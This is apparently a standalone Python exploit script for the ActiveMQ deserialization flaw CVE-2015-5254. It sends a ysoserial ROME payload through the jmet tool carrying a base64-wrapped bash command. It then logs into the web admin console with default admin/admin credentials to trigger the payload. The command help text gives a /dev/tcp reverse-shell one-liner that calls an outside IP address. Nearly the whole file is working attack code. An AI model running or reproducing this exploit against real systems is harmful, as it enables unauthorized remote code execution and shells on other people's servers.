# -*- coding: utf-8 -*-
# author: seven
# activemq unserialize cve-2015-5254


import requests
from requests.auth import HTTPBasicAuth
import os
import argparse
import logging
import base64

logger = logging.getLogger('avtivemq')
logger.setLevel(logging.DEBUG)
hdr = logging.StreamHandler()
formatter = logging.Formatter('[%(asctime)s] %(name)s:%(levelname)s: %(message)s')
hdr.setFormatter(formatter)
logger.addHandler(hdr)

def init_parser():
    parser = argparse.ArgumentParser(description="used for cve-2015-5254 exploit")
    parser.add_argument("host",type=str,help="specify the host")

    parser.add_argument("-m","--msgport",default=61616,type=int,help="specify the message port")
    parser.add_argument("-w","--webport",default=8161,type=int,help="specify the web port")
    parser.add_argument("-u","--username",default='admin',type=str,help="specify the username")
    parser.add_argument("-p","--password",default='admin',type=str,help="specify the password")

    parser.add_argument("--cmd",required=True,help="specify cmd to execute.like:'bash -i >& /dev/tcp/10.37.129.2/43211>&1' for reverse jump",)
    args = parser.parse_args()
    return args

def ysoserial_attack(args):
    # cmd = f'bash -i >& /dev/tcp/{args.lhost}/{args.lport}>&1'
    base64_cmd = 'bash -c {echo,'+ base64.b64encode(args.cmd.encode()).decode() +'}|{base64,-d}|{bash,-i}'
    java_cmd = f'java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "{base64_cmd}" -Yp ROME {args.host}  {args.msgport}'
    try:
        r = os.popen(java_cmd)  
        text = r.read()  
        r.close()
        lines = text.split()
        print(text)
        if 'ID:' in lines[-1]:
            line = lines[-1]
            return line[:-6]
    except:
        pass
    raise Exception('java payload send error:',text)

def trigger(host,port,username,password,id_feature):
    # 触发最新的messageID
    try:
        res = requests.get(f'http://{host}:{port}/admin/browse.jsp?JMSDestination=event',auth=HTTPBasicAuth(username,password))
        if not res.status_code == 200:
            logger.info('visit admin page error')
            return False
        if id_feature in res.text:
            index = res.text.index(id_feature)
            tmp = res.text[index:]
            full_id = tmp.split('</a>')[0]
            logger.info(full_id)
            res2 = requests.get(f'http://{host}:{port}/admin/message.jsp',auth=HTTPBasicAuth(username,password),params={
                'id':full_id,
                'JMSDestination':'event'
            })
            if res2.status_code == 200:
                logger.info('trigger id success')
                return True
            else:
                logger.info('trgger id fail')
    except Exception as e:
        logger.info(str(e))
    return False

if __name__ == "__main__":
    args = init_parser()
    try:
        id_feature = ysoserial_attack(args)
    except Exception as e:
        logger.info(str(e))
        exit(1)
    if trigger(args.host,args.webport,args.username,args.password,id_feature):
        logger.info('STEP 2:trigger success')
    




